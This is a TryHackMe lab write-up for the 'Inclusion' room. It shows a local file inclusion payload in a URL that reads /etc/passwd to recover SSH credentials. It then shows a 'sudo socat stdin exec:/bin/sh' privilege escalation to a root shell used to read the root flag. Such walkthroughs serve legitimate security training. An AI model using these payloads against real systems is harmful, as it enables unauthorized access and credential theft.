---
title: "Inclusion Writeup | TryHackMe"
layout: default
---

# Inclusion #

This room talks about LFI vulnerability in which an attacker tricks the web server to expose critical data this happens when a web server trusts user input which can lead to path transversal.

## Nmap Scan ##
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
There are only two ports open in the web server running on the port 80 and ssh on the port 22.

## Enumeration ##
- Enter `http://<Machine_IP>/` in your browser.
- Open any article from the website.
- Enter `<http://Machine_IP>/article?name=/<LFI_Payload>/`.
  ### URL with Payload ###
  `<http://Machine_IP>/article?name=/../../../../etc/passwd/`.
- In /etc/passwd you can find a user and password.
> username - falconfeast

> password - xxxxxxxxxxxx
- Login using the credentials via ssh.

## Exploitation ##
- Once you access the machine you can find user.txt with user flag in it.
- Use the command `sudo -l` to know the priveleges of the current user.
- user falconfeast has sudo permission to socat.
- Run the command `sudo socat stdin exec:/bin/sh`.
- Running the command should give you elevated shell 
- Test it by running `whoami` should print as root.
- Now print the root flag by `cat /root/root.txt`.



